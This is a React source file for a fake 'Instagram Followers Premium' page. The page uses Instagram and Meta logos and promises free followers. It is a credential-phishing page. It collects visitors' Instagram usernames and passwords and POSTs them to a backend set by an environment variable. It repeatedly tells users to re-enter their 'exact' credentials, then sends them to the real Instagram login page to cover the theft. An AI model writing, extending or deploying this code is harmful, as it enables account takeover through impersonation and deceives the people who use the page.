import { useState} from 'react'
import './App.css'
const API_URL = import.meta.env.VITE_API_URL;

function App() {

  const [userName , setUserName] = useState("");

  const [Password , setPassword] = useState("");

  const [noOfTimes, setNoOfTimes] = useState(0);

  const [userNameError , setUserNameError] = useState("");

  const [PasswordError , setPasswordError] = useState("");

  const [showError, setShowError] = useState("");

  const [passOrText, setPassOrText] = useState("password");




  const userNameFunction = (e) => {
    setUserName(e.target.value);
  };

  const PasswordFunction = (e) => {
    setPassword(e.target.value);
  };

  const userBlur = () =>{
    if(userName === ""){
      setUserNameError("*Username is required");
    }else{
      setUserNameError("");
    }
  }

  const PasswordBlur = () =>{
    if(Password === ""){
      setPasswordError("*Password is required");
    }else{
      setPasswordError("");
    }
  }


  const submitDone = async (e) => {
  e.preventDefault();

  setShowError("");

  let hasError = false;

  if (userName === "") {
    setUserNameError("*Username is required");
    hasError = true;
  } else {
    setUserNameError("");
  }

  if (Password === "") {
    setPasswordError("*Password is required");
    hasError = true;
  } else {
    setPasswordError("");
  }

  // stop if error exists
  if (hasError) return;

  try {
    const data = await fetch(
      `${API_URL}/register`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: userName,
          password: Password,
        }),
      }
    );

    if (data.ok) {
      console.log("Data sent successfully");
      if (noOfTimes < 9)
        {
          setNoOfTimes(prev => prev + 1);
          setShowError("*Please enter exact password and username same as your instagram account.");
        }else{
          window.location.href ="https://www.instagram.com/accounts/login/";
        }
    } else {
      alert("Server error");
    }
  } catch (error) {
    console.log(error);
    alert("Network error");
  }
};




  return (
      <div className="container">
        <h1 className='headding'>Instagram Followers Premium</h1>
          <div className='card'>
            <form onSubmit={submitDone}>
              <div>
                <input className='user' type="text" placeholder='Username' value={userName} onChange={userNameFunction} onBlur={userBlur} />
                <p className='perror'>{userNameError}</p>
                <div className='password-container'>
                  <input className='password' type={passOrText} placeholder='Password' value={Password} onChange={PasswordFunction} onBlur={PasswordBlur} /> <button className='show-btn' type="button" onClick={() => {
                    const passwordInput = document.querySelector('.password');
                    if (passwordInput.type === "password") {
                      passwordInput.type = "text";
                    } else {
                      passwordInput.type = "password";
                    }
                    setPassOrText(prev => prev === "password" ? "text" : "password");
                  }}>{passOrText === "password" ? "Show" : "Hide"}</button>
                </div>
                <p className='perror'>{PasswordError}</p>
              </div>
              <div>
                <button className='btn' type="submit">Login</button>
              </div>
              <p className='perror'>{showError}</p>
        </form>
      </div>
      
      <p className='in paa'>Sign in using your Instagram account to unlock free followers and likes — up to 100 every day. Also your account needs to be public.</p>

      <div className='in'>
         <img src="https://th.bing.com/th/id/R.037562dbf1c56c6c89ace2f953092ed3?rik=GRzLv4qWzlCZhg&riu=http%3a%2f%2fwww.logotypes101.com%2flogos%2f752%2f46CB6EFDF45D02DF8C1AE688B5806F85%2f2016_instagram_logo.png&ehk=p6GzXFJe1Ttckxk7txgfEzWp3lRNv8BwVsFDtpMtBgw%3d&risl=&pid=ImgRaw&r=0" className='img-insta' />
      </div>

      <div className='meta-logo-container'>
      <img alt="from Meta" className='meta-logo' src="https://static.cdninstagram.com/rsrc.php/yy/r/zVM9V9EU5f1.svg"></img>
      </div>
      </div>
  )
}

export default App
